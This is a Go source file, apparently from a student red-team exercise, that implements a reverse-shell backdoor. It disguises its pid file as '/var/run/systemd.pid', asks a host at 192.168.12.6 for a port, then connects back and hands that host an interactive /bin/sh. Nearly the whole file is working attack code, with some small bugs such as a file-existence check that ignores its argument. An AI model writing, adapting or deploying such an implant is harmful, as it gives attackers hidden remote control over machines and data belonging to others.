//Michael Burke, mdb5315@rit.edu
package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

var HOST_CONNECT string = "192.168.12.6:"

func main() {
	//See if there is already an instance of the process running
	proc := FindProcess()
	if proc {
		//If there is, exit
		fmt.Printf("Process is running!")
		return
	}
	//Delete the pid file, if it exists
	tmpcmd := exec.Command("rm /var/run/systemd.pid")
	tmpcmd.Run()
	//Get the current pid and write it to the file
	currentPid := strconv.Itoa(os.Getpid())
	ioutil.WriteFile("/var/run/systemd.pid", []byte(currentPid), 0644)
	connectPort := GetPort()
	EstablishConnection(connectPort)
}

func GetPort() string {
	getPort, err := net.Dial("tcp", HOST_CONNECT+"5003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "420"
	}
	defer getPort.Close()
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}
func EstablishConnection(port string) {
	//Establish reverse connection to host
	con, _ := net.Dial("tcp", HOST_CONNECT+port)
	cmd := exec.Command("/bin/sh")
	//Set input/output to the established connection's in/out
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}

func CheckFileExists(file string) bool {
	//Can use the following if go is actually up to date
	//if _, err := os.Stat(file); errors.Is(err, os.ErrNotExist) {
	if _, err := os.Stat("file-exists.go"); err != nil {
		return false
	}
	return true
}

func CheckPid(pid int) bool {
	out, err := exec.Command("kill", "-s", "0", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		log.Println(err)
	}
	if string(out) == "" {
		//IT RUNNING
		return true
	}
	//IT NO RUNNING
	return false
}

func FindProcess() bool {
	//Test to see if process is already running
	if !CheckFileExists("/var/run/systemd.pid") {
		return false
	}
	dat, _ := ioutil.ReadFile("/var/run/systemd.pid")
	pid := string(dat)
	pid = strings.TrimSuffix(pid, "\n")
	fmt.Printf("PID: " + pid)
	pidint, _ := strconv.Atoi(pid)
	return CheckPid(pidint)
}
